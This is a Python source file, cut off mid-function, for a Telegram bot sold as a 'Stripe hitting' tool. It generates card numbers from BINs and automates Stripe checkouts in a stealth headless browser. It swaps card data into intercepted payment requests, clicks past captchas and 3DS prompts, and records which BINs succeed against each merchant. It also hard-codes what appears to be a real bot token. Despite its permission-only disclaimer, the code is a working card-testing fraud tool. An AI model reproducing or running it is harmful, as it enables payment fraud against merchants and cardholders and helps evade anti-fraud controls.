import re
import time
import random
import sqlite3
import asyncio
import requests
import urllib3
import sys
import os
import logging
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
from dataclasses import dataclass
from enum import Enum

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.constants import ParseMode
from playwright.async_api import async_playwright, Page, Route, Request

# ============= CONFIGURATION =============
TOKEN = "8655467693:AAFE3LANb3H49vlkwPmZld_TCfF9iT0CMns"
DATABASE = "ankit_hitter.db"
MAX_ATTEMPTS = 100
REQUEST_TIMEOUT = 15
MAX_CONCURRENT = 3

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

# Conversation states
(WAITING_URL, WAITING_CARD_SOURCE, WAITING_BIN, WAITING_CARD_COUNT, 
 WAITING_MANUAL_CARDS, WAITING_HIT_COUNT, WAITING_CONCURRENT) = range(7)

class CardSource(Enum):
    GENERATE = "generate"
    MANUAL = "manual"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============= DATABASE SETUP =============
def init_db():
    """Initialize database with all required tables"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    # Bins table
    c.execute('''CREATE TABLE IF NOT EXISTS bins (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        bin TEXT, 
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Cards table
    c.execute('''CREATE TABLE IF NOT EXISTS cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_number TEXT, 
        month TEXT, 
        year TEXT, 
        cvv TEXT,
        success_count INTEGER DEFAULT 0, 
        fail_count INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Hits table
    c.execute('''CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, 
        card TEXT, 
        merchant TEXT, 
        product TEXT, 
        amount TEXT,
        success INTEGER, 
        decline_code TEXT, 
        receipt_url TEXT, 
        response_time REAL,
        user_id INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Patterns table for AI learning
    c.execute('''CREATE TABLE IF NOT EXISTS patterns (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        merchant TEXT, 
        bin_pattern TEXT, 
        success_count INTEGER DEFAULT 0, 
        fail_count INTEGER DEFAULT 0,
        last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        UNIQUE(merchant, bin_pattern)
    )''')
    
    # User settings table
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings (
        user_id INTEGER PRIMARY KEY,
        max_concurrent INTEGER DEFAULT 3,
        auto_learn INTEGER DEFAULT 1,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Proxies table (optional)
    c.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy TEXT UNIQUE,
        is_active INTEGER DEFAULT 1,
        success_count INTEGER DEFAULT 0,
        fail_count INTEGER DEFAULT 0,
        last_used TIMESTAMP
    )''')
    
    conn.commit()
    conn.close()
    logger.info("Database initialized successfully")

# ============= URL ANALYZER =============
class URLAnalyzer:
    @staticmethod
    def extract_amount(html: str) -> Optional[str]:
        patterns = [
            r'"amount":(\d+)',
            r'\$(\d+(?:\.\d{2})?)',
            r'data-amount="(\d+)"',
            r'Total:?\s*[\$€£]?\s*([\d,]+\.?\d*)',
            r'price["\']?\s*:\s*["\']?([\d.]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                amount = match.group(1).replace(',', '')
                if amount.isdigit() and len(amount) > 2:
                    return f"${int(amount)/100:.2f}"
                return f"${amount}"
        return None
    
    @staticmethod
    def extract_product_name(html: str) -> Optional[str]:
        patterns = [
            r'"name":"([^"]+)"',
            r'<title>(.*?)</title>',
            r'<h1[^>]*>(.*?)</h1>',
            r'<meta property="og:title" content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                name = match.group(1).strip()
                name = re.sub(r'\s*[|–-]\s*Stripe.*$', '', name, flags=re.IGNORECASE)
                name = re.sub(r'\s*[|–-]\s*Checkout.*$', '', name, flags=re.IGNORECASE)
                if name and len(name) > 3:
                    return name[:80]
        return None
    
    @staticmethod
    def extract_merchant(html: str) -> str:
        patterns = [
            r'"business_name":"([^"]+)"',
            r'<title>(.*?)\s*[|–-]\s*Stripe',
            r'<meta property="og:site_name" content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        return "Unknown"
    
    @staticmethod
    def analyze_url(url: str) -> Dict:
        result = {'url': url, 'merchant': 'Unknown', 'product': 'Unknown', 'amount': None, 'success': False}
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            }
            resp = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
            if resp.status_code == 200:
                html = resp.text
                result['merchant'] = URLAnalyzer.extract_merchant(html)
                result['product'] = URLAnalyzer.extract_product_name(html) or 'Unknown'
                result['amount'] = URLAnalyzer.extract_amount(html)
                result['success'] = True
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"URL analysis error: {e}")
        return result

# ============= FINGERPRINT GENERATOR =============
class FingerprintGenerator:
    @staticmethod
    def generate() -> Dict:
        return {
            'user_agent': random.choice(USER_AGENTS),
            'viewport': {'width': random.choice([1366, 1440, 1536, 1920]), 'height': 768},
            'locale': random.choice(['en-US', 'en-GB', 'en-CA']),
            'timezone_id': random.choice(['America/New_York', 'America/Los_Angeles', 'Europe/London', 'Asia/Tokyo'])
        }
    
    @staticmethod
    def get_stealth_script() -> str:
        return """
        // Remove webdriver property
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        
        // Add chrome object
        window.chrome = { runtime: {} };
        
        // Modify plugins length
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        
        // Modify languages
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        // Modify platform
        Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
        
        // Remove playwright properties
        delete window.__playwright__binding__;
        delete window.__pwInitScripts;
        
        // Override permissions
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );
        """
    
    @staticmethod
    def get_webgl_vendor() -> str:
        vendors = ['Google Inc.', 'Intel Inc.', 'NVIDIA Corporation', 'AMD']
        return random.choice(vendors)

# ============= CARD PATTERN LEARNER =============
class CardPatternLearner:
    def __init__(self):
        self.patterns: Dict[str, Dict[str, Dict]] = defaultdict(dict)
        self.load_from_db()
    
    def load_from_db(self):
        """Load patterns from database with error handling"""
        try:
            conn = sqlite3.connect(DATABASE)
            c = conn.cursor()
            c.execute("SELECT merchant, bin_pattern, success_count, fail_count FROM patterns")
            rows = c.fetchall()
            for merchant, bin_pattern, success, fail in rows:
                if merchant not in self.patterns:
                    self.patterns[merchant] = {}
                self.patterns[merchant][bin_pattern] = {'success': success, 'fail': fail}
            conn.close()
            logger.info(f"Loaded {len(rows)} patterns from database")
        except Exception as e:
            logger.error(f"Error loading patterns: {e}")
    
    def learn(self, card: Dict, merchant: str, success: bool):
        """Learn from a hit result"""
        try:
            bin_pattern = card['card'][:6]
            if merchant not in self.patterns:
                self.patterns[merchant] = {}
            if bin_pattern not in self.patterns[merchant]:
                self.patterns[merchant][bin_pattern] = {'success': 0, 'fail': 0}
            
            if success:
                self.patterns[merchant][bin_pattern]['success'] += 1
            else:
                self.patterns[merchant][bin_pattern]['fail'] += 1
            
            # Save to database
            conn = sqlite3.connect(DATABASE)
            c = conn.cursor()
            c.execute("""INSERT OR REPLACE INTO patterns (merchant, bin_pattern, success_count, fail_count, last_updated) 
                         VALUES (?, ?, ?, ?, ?)""",
                      (merchant, bin_pattern, 
                       self.patterns[merchant][bin_pattern]['success'],
                       self.patterns[merchant][bin_pattern]['fail'],
                       datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Error learning pattern: {e}")
    
    def suggest_best_pattern(self, merchant: str) -> Optional[str]:
        """Suggest best BIN pattern for merchant"""
        if merchant not in self.patterns:
            return None
        best = None
        best_rate = -1
        for pattern, data in self.patterns[merchant].items():
            total = data['success'] + data['fail']
            if total > 0:
                rate = data['success'] / total * 100
                if rate > best_rate and data['success'] >= 2:
                    best_rate = rate
                    best = pattern
        return best
    
    def get_stats(self, merchant: str) -> Dict:
        """Get statistics for a merchant"""
        if merchant not in self.patterns:
            return {'total_success': 0, 'total_fail': 0, 'total_hits': 0, 'success_rate': 0}
        
        total_success = sum(data['success'] for data in self.patterns[merchant].values())
        total_fail = sum(data['fail'] for data in self.patterns[merchant].values())
        total_hits = total_success + total_fail
        success_rate = (total_success / total_hits * 100) if total_hits > 0 else 0
        
        return {
            'total_success': total_success,
            'total_fail': total_fail,
            'total_hits': total_hits,
            'success_rate': success_rate
        }

# ============= SMART RATE LIMITER =============
class SmartRateLimiter:
    def __init__(self):
        self.current_delay = 1.0
        self.consecutive_failures = 0
        self.consecutive_successes = 0
    
    def calculate_delay(self, last_result: str) -> float:
        if last_result == 'success':
            self.consecutive_failures = 0
            self.consecutive_successes += 1
            # Gradually decrease delay on success
            if self.consecutive_successes > 3:
                self.current_delay = max(0.5, self.current_delay * 0.95)
        elif last_result == 'declined':
            self.consecutive_successes = 0
            self.consecutive_failures += 1
            # Increase delay on failures
            self.current_delay = min(10, self.current_delay * 1.2 + self.consecutive_failures * 0.2)
        else:
            # Reset on other results
            self.consecutive_failures = 0
            self.consecutive_successes = 0
        
        return max(0.5, min(10, self.current_delay))

# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def get_card_brand(card_number: str) -> str:
        first6 = re.sub(r'\D', '', card_number)[:6]
        if re.match(r'^3[47]', first6): return 'amex'
        if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6): return 'mastercard'
        if re.match(r'^4', first6): return 'visa'
        if re.match(r'^6', first6): return 'discover'
        return 'unknown'
    
    @staticmethod
    def luhn_checksum(card_number: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10
    
    @staticmethod
    def generate_card(bin_number: str) -> Optional[Dict]:
        if not bin_number or len(bin_number) < 4:
            return None
        
        parts = bin_number.split('|')
        bin_pattern = re.sub(r'[^0-9xX]', '', parts[0])
        test_bin = bin_pattern.replace('x', '0').replace('X', '0')
        brand = CardGenerator.get_card_brand(test_bin)
        
        target_len = 15 if brand == 'amex' else 16
        cvv_len = 4 if brand == 'amex' else 3
        
        card = ''
        for c in bin_pattern:
            card += str(random.randint(0, 9)) if c.lower() == 'x' else c
        
        remaining = target_len - len(card) - 1
        for _ in range(remaining):
            card += str(random.randint(0, 9))
        
        # Find valid check digit
        check_digit = 0
        for i in range(10):
            if CardGenerator.luhn_checksum(card + str(i)) == 0:
                check_digit = i
                break
        
        full_card = card + str(check_digit)
        
        # Month
        month = f"{random.randint(1, 12):02d}"
        if len(parts) > 1 and parts[1]:
            month = parts[1].zfill(2) if parts[1].lower() != 'xx' else f"{random.randint(1, 12):02d}"
        
        # Year
        year = f"{datetime.now().year + random.randint(1, 5)}"
        if len(parts) > 2 and parts[2]:
            if parts[2].lower() != 'xx':
                year = parts[2].zfill(2)
            else:
                year = f"{datetime.now().year + random.randint(1, 5)}"
        year = year[-2:]  # Take last 2 digits
        
        # CVV
        cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
        if len(parts) > 3 and parts[3]:
            if parts[3].lower() in ('xxx', 'xxxx'):
                cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
            else:
                cvv = parts[3].zfill(cvv_len)
        
        return {'card': full_card, 'month': month, 'year': year, 'cvv': cvv, 'brand': brand}
    
    @staticmethod
    def generate_cards(bin_number: str, count: int = 10) -> List[Dict]:
        cards = []
        for _ in range(count):
            card = CardGenerator.generate_card(bin_number)
            if card:
                cards.append(card)
        return cards
    
    @staticmethod
    def validate_card(card: Dict) -> bool:
        """Validate card details"""
        try:
            # Check card number length
            card_num = re.sub(r'\D', '', card['card'])
            if len(card_num) not in [15, 16]:
                return False
            
            # Luhn check
            if CardGenerator.luhn_checksum(card_num) != 0:
                return False
            
            # Check month
            month = int(card['month'])
            if month < 1 or month > 12:
                return False
            
            # Check year
            year = int(card['year'])
            current_year = datetime.now().year % 100
            if year < current_year or year > current_year + 10:
                return False
            
            return True
        except:
            return False

# ============= STRIPE AUTOFILL =============
class StripeAutofill:
    CARD_FIELD_SELECTORS = [
        '#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]',
        '[data-elements-stable-field-name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[placeholder*="card number"]',
        'input[aria-label*="Card number"]', '[class*="CardNumberInput"] input',
        'input[name="number"]', 'input[id*="card-number"]', '.InputElement'
    ]
    
    EXPIRY_FIELD_SELECTORS = [
        '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
        '[data-elements-stable-field-name="cardExpiry"]',
        'input[placeholder*="MM / YY"]', 'input[placeholder*="MM/YY"]',
        'input[placeholder*="MM"]', '[class*="CardExpiry"] input',
        'input[placeholder*="Expiry"]'
    ]
    
    CVC_FIELD_SELECTORS = [
        '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
        '[data-elements-stable-field-name="cardCvc"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        '[class*="CardCvc"] input', 'input[name="cvc"]',
        'input[placeholder*="Security"]'
    ]
    
    NAME_FIELD_SELECTORS = [
        '#billingName', '[name="billingName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[name="name"]',
        'input[placeholder*="Full name"]'
    ]
    
    EMAIL_FIELD_SELECTORS = [
        'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
        'input[placeholder*="email"]', 'input[placeholder*="Email"]'
    ]
    
    SUBMIT_BUTTON_SELECTORS = [
        '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
        '[data-testid*="submit"]', 'button:has-text("Pay")',
        'button:has-text("Submit")', 'button:has-text("Purchase")',
        '[class*="checkout"] button'
    ]
    
    MASKED_CARD = "0000000000000000"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "000"
    
    def __init__(self, page: Page):
        self.page = page
        self.real_card = None
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and "stripe.com" in request.url:
                post_data = request.post_data
                if post_data and self.real_card:
                    # Replace masked values with real card data
                    post_data = post_data.replace("card[number]=0000000000000000", f"card[number]={self.real_card['card']}")
                    post_data = post_data.replace("card[exp_month]=01", f"card[exp_month]={self.real_card['month']}")
                    post_data = post_data.replace("card[exp_year]=30", f"card[exp_year]={self.real_card['year']}")
                    post_data = post_data.replace("card[cvc]=000", f"card[cvc]={self.real_card['cvv']}")
                    post_data = post_data.replace("card[expiry]=01/30", f"card[expiry]={self.real_card['month']}/{self.real_card['year']}")
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_click_field(self, selectors: List[str]) -> bool:
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.focus()
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        # Card number
        await self.find_and_click_field(self.CARD_FIELD_SELECTORS)
        await self.page.keyboard.type(self.MASKED_CARD, delay=random.randint(5, 12))
        
        # Expiry
        await self.page.keyboard.press('Tab')
        await self.page.keyboard.type(self.MASKED_EXPIRY, delay=random.randint(5, 12))
        
        # CVV
        await self.page.keyboard.press('Tab')
        await self.page.keyboard.type(self.MASKED_CVV, delay=random.randint(5, 12))
        
        # Name
        if await self.find_and_click_field(self.NAME_FIELD_SELECTORS):
            await self.page.keyboard.type("ALCAME HITTER", delay=random.randint(5, 12))
        else:
            name_input = await self.page.query_selector('input[name="name"], input[placeholder*="Name"]')
            if name_input:
                await name_input.fill("ALCAME HITTER")
        
        # Email
        email = f"ankit{random.randint(100,9999)}@example.com"
        if await self.find_and_click_field(self.EMAIL_FIELD_SELECTORS):
            await self.page.keyboard.type(email, delay=random.randint(5, 12))
        else:
            email_input = await self.page.query_selector('input[type="email"]')
            if email_input:
                await email_input.fill(email)
        
        await asyncio.sleep(0.5)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_BUTTON_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False
    
    async def detect_3ds(self) -> bool:
        iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"], iframe[src*="secure"]')
        for iframe in iframes:
            if await iframe.is_visible():
                return True
        text = await self.page.text_content('body')
        if text and ('3D Secure' in text or 'Authentication' in text or 'Verified by' in text):
            return True
        return False
    
    async def wait_for_3ds(self, timeout: int = 15000) -> bool:
        start = time.time()
        while (time.time() - start) * 1000 < timeout:
            if await self.detect_3ds():
                return True
            await asyncio.sleep(0.5)
        return False
    
    async def auto_complete_3ds(self) -> bool:
        if not await self.detect_3ds():
            return False
        
        # Try to find and submit form
        form = await self.page.query_selector('form')
        if form:
            await form.evaluate('form => form.submit()')
            await asyncio.sleep(3)
            return True
        
        # Try to find continue button
        cont = await self.page.query_selector('button:has-text("Continue"), button:has-text("Submit"), button:has-text("Complete")')
        if cont:
            await cont.click()
            await asyncio.sleep(3)
            return True
        
        return False
    
    async def handle_captcha(self):
        try:
            # hCaptcha
            frame_locator = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
            if frame_locator:
                checkbox = frame_locator.locator('#checkbox').first
                if await checkbox.is_visible():
                    await checkbox.click()
                    await asyncio.sleep(2)
                    return True
            
            # reCaptcha
            recaptcha = await self.page.query_selector('.g-recaptcha')
            if recaptcha:
                await recaptcha.click()
                await asyncio.sleep(2)
                return True
        except:
            pass
        return False

# ============= HITTER ENGINE =============
@dataclass
class HitResult:
    attempt: int
    card: Dict
    success: bool
    decline_code: Optional[str] = None
    receipt_url: Optional[str] = None
    response_time: float = 0.0
    error: Optional[str] = None

class HitterEngine:
    def __init__(self, max_concurrent: int = MAX_CONCURRENT):
        self.results: List[HitResult] = []
        self.successes = 0
        self.fails = 0
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.rate_limiter = SmartRateLimiter()
        self.progress_callback = None
    
    async def hit(self, url: str, card: Dict, merchant: str, product: str, amount: str, attempt_num: int) -> HitResult:
        async with self.semaphore:
            return await self._single_hit(url, card, merchant, product, amount, attempt_num)
    
    async def _single_hit(self, url: str, card: Dict, merchant: str, product: str, amount: str, attempt_num: int) -> HitResult:
        start_time = time.time()
        result = HitResult(
            attempt=attempt_num,
            card=card,
            success=False,
            response_time=0
        )
        
        try:
            async with async_playwright() as p:
                fingerprint = FingerprintGenerator.generate()
                
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--no-sandbox',
                        '--disable-dev-shm-usage',
                        '--disable-web-security',
                        '--disable-features=IsolateOrigins,site-per-process',
                        '--disable-setuid-sandbox',
                        '--disable-accelerated-2d-canvas',
                        '--disable-gpu'
                    ]
                )
                
                context_options = {
                    'user_agent': fingerprint['user_agent'],
                    'viewport': fingerprint['viewport'],
                    'locale': fingerprint['locale'],
                    'timezone_id': fingerprint['timezone_id'],
                    'ignore_https_errors': True,
                    'java_script_enabled': True,
                }
                
                browser_context = await browser.new_context(**context_options)
                page = await browser_context.new_page()
                
                await page.add_init_script(FingerprintGenerator.get_stealth_script())
                
                # Navigate to URL
                await page.goto(url, timeout=30000, wait_until='domcontentloaded')
                await asyncio.sleep(2)
                
                # Handle any popups
                try:
                    await page.wait_for_timeout(1000)
                except:
                    pass
                
                autofill = StripeAutofill(page)
                await autofill.handle_captcha()
                await autofill.enable_card_replace(card)
                await autofill.fill_card(card)
                
                submitted = await autofill.submit()
                if not submitted:
                    result.error = 'Submit button not found'
                    await browser.close()
                    return result
                
                # Wait for response
                await asyncio.sleep(5)
                
                # Handle 3DS if present
                if await autofill.wait_for_3ds(15000):
                    await autofill.auto_complete_3ds()
                    await asyncio.sleep(5)
                
                await autofill.handle_captcha()
                
                current_url = page.url
                result.response_time = time.time() - start_time
                
                # Check for success
                if 'receipt' in current_url or 'thank_you' in current_url or 'success' in current_url:
                    result.success = True
                    result.receipt_url = current_url
                    self.successes += 1
                else:
                    # Try to get error message
                    try:
                        error_text = await page.text_content('body')
                        if error_text:
                            if 'declined' in error_text.lower():
                                result.decline_code = 'card_declined'
                            elif 'insufficient' in error_text.lower():
                                result.decline_code = 'insufficient_funds'
                            elif 'expired' in error_text.lower():
                                result.decline_code = 'expired_card'
                            else:
                                result.decline_code = 'unknown'
                    except:
                        result.decline_code = 'unknown'
                    self.fails += 1
                
                await browser.close()
                
        except Exception as e:
            result.error = str(e)
            result.decline_code = 'exception'
            logger.error(f"Hit error: {e}")
        
        self.results.append(result)
        
        if self.progress_callback:
            await self.progress_callback(result)
        
        return result

# ============= TELEGRAM BOT =============
class ANKITHitterBot:
    def __init__(self, token: str):
        self.token = token
        self.application = Application.builder().token(token).build()
        self.user_data = {}
        self.pattern_learner = CardPatternLearner()
        
        # Register handlers
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("settings", self.settings_command))
        self.application.add_handler(CommandHandler("patterns", self.patterns_command))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))
        
        # Conversation handler for hitting
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("hit", self.hit_start)],
            states={
                WAITING_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.hit_url_received)],
                WAITING_CARD_SOURCE: [CallbackQueryHandler(self.card_source_selected)],
                WAITING_BIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.bin_received)],
                WAITING_CARD_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.card_count_received)],
                WAITING_MANUAL_CARDS: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.manual_cards_received)],
                WAITING_HIT_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.hit_count_received)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_command)],
        )
        self.application.add_handler(conv_handler)
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send a welcome message when /start is issued."""
        user = update.effective_user
        welcome_text = f"""
╔══════════════════════════════════════════════════════╗
║     🔥 ALCAME HITTER TELEGRAM BOT v2.0 🔥              ║
║     Advanced Stripe Hitting Tool                     ║
╚══════════════════════════════════════════════════════╝

Hello {user.first_name}! 👋

I'm a professional Stripe hitting bot with advanced features:

✨ **Features:**
• Anti-Detection & Fingerprint Randomization
• AI-Powered Card Pattern Learning
• Smart Rate Limiting
• 3DS Auto-Bypass
• Captcha Solver
• URL Product & Amount Extractor
• Complete Stripe Autofill
• Multi-Threaded Hitting

📌 **Commands:**
/hit - Start a new hitting session
/stats - View your hitting statistics
/patterns - View AI learning patterns
/settings - Configure bot settings
/help - Show this help message
/cancel - Cancel current operation

⚠️ **Disclaimer:** Use responsibly and only on sites you own or have permission to test.
        """
        await update.message.reply_text(welcome_text, parse_mode=ParseMode.HTML)
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send a help message."""
        help_text = """
📖 **ALCAME HITTER Bot Help**

**How to use:**
1. Use /hit to start a new session
2. Enter the Stripe checkout URL
3. Choose card source (generate from BIN or manual)
4. Enter BIN or cards
5. Select number of attempts
6. Wait for results!

**Card Formats:**
- BIN: `424242` or `424242|12|26|123`
- Manual: `4242424242424242|12|26|123`

**BIN Format:**
- Simple: `424242`
- With details: `424242|12|26|123`
  (BIN|Month|Year|CVV)

**Tips:**
• The bot uses AI learning to improve success rates
• Smart rate limiting prevents blocks
• 3DS challenges are auto-handled when possible
• Results are saved to database for analysis

**Commands:**
/hit - Start hitting session
/stats - View statistics
/patterns - View AI learning patterns
/settings - Configure settings
/cancel - Cancel current operation
/help - This message
        """
        await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show statistics for the user."""
        user_id = update.effective_user.id
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        
        try:
            c.execute("""SELECT COUNT(*), SUM(success), SUM(CASE WHEN success=0 THEN 1 ELSE 0 END)
                         FROM hits WHERE user_id=?""", (user_id,))
            result = c.fetchone()
            total = result[0] if result[0] else 0
            successes = result[1] if result[1] else 0
            fails = result[2] if result[2] else 0
            
            c.execute("""SELECT merchant, COUNT(*), SUM(success)
                         FROM hits WHERE user_id=?
                         GROUP BY merchant ORDER BY COUNT(*) DESC LIMIT 5""", (user_id,))
            top_merchants = c.fetchall()
            
            success_rate = (successes / total * 100) if total > 0 else 0
            
            stats_text = f"""
📊 **Your Statistics**

🎯 **Overall:**
• Total Hits: {total}
• Successful: {successes}
• Failed: {fails}
• Success Rate: {success_rate:.1f}%

🏢 **Top Merchants:**
"""
            for merchant, count, s in top_merchants:
                rate = (s / count * 100) if count > 0 else 0
                stats_text += f"• {merchant[:30]}: {count} hits ({rate:.0f}%)\n"
            
            if total == 0:
                stats_text += "\nNo hits yet! Use /hit to start."
            
            await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await update.message.reply_text(f"Error fetching stats: {e}")
        finally:
            conn.close()
    
    async def patterns_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show AI learning patterns."""
        if not self.pattern_learner.patterns:
            await update.message.reply_text("No patterns learned yet! Start hitting to train the AI.")
            return
        
        patterns_text = "🧠 **AI Learning Patterns**\n\n"
        for merchant, patterns in list(self.pattern_learner.patterns.items())[:5]:
            patterns_text += f"**{merchant[:30]}:**\n"
            for bin_pattern, data in list(patterns.items())[:3]:
                total = data['success'] + data['fail']
                rate = (data['success'] / total * 100) if total > 0 else 0
                patterns_text += f"  • BIN {bin_pattern}: {data['success']}/{total} ({rate:.0f}%)\n"
            patterns_text += "\n"
        
        await update.message.reply_text(patterns_text, parse_mode=ParseMode.MARKDOWN)
    
    async def settings_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show settings and allow configuration."""
        user_id = update.effective_user.id
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        try:
            c.execute("INSERT OR IGNORE INTO user_settings (user_id, max_concurrent, auto_learn) VALUES (?, ?, ?)",
                      (user_id, MAX_CONCURRENT, 1))
            c.execute("SELECT max_concurrent, auto_learn FROM user_settings WHERE user_id=?", (user_id,))
            result = c.fetchone()
            max_concurrent = result[0] if result else MAX_CONCURRENT
            auto_learn = result[1] if result else 1
        finally:
            conn.close()
        
        keyboard = [
            [InlineKeyboardButton(f"⚡ Max Concurrent: {max_concurrent}", callback_data="settings_concurrent")],
            [InlineKeyboardButton(f"🧠 Auto Learn: {'ON' if auto_learn else 'OFF'}", callback_data="settings_autolearn")],
            [InlineKeyboardButton("📊 Reset Statistics", callback_data="settings_reset")],
            [InlineKeyboardButton("🗑️ Clear Patterns", callback_data="settings_clear_patterns")],
            [InlineKeyboardButton("🔙 Back", callback_data="settings_back")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("⚙️ **Settings**\nConfigure your bot preferences:", 
                                        parse_mode=ParseMode.MARKDOWN,
                                        reply_markup=reply_markup)
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks."""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        data = query.data
        
        if data == "settings_concurrent":
            await query.edit_message_text("Enter max concurrent hits (1-10):")
            context.user_data['setting'] = 'concurrent'
            return
        
        elif data == "settings_autolearn":
            conn = sqlite3.connect(DATABASE)
            c = conn.cursor()
            try:
                c.execute("SELECT auto_learn FROM user_settings WHERE user_id=?", (user_id,))
                current = c.fetchone()
                new_value = 0 if current and current[0] else 1
                c.execute("INSERT OR REPLACE INTO user_settings (user_id, auto_learn) VALUES (?, ?)",
                          (user_id, new_value))
                conn.commit()
